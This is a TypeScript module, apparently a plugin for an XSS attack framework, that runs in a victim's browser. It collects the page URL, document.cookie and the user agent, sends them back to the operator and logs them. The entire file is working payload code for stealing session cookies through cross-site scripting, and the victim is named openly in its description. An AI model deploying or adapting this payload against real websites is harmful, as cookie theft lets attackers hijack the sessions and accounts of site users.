import { XSSModule } from '../types/index.js';

export const basicInfoModule: XSSModule = {
  name: 'Basic info',
  description: 'Gets some basic information about the victim and its browser, e.g. URL address of current page, cookies etc.',
  
  execute: (send) => {
    send({
      url: location.href,
      cookie: document.cookie,
      ua: navigator.userAgent,
    });
  },
  
  handleResult: (log, data) => {
    log('Cookies: ' + data.cookie);
    log('User-Agent: ' + data.ua);
    log('Current URL: ' + data.url);
  }
};

export default basicInfoModule;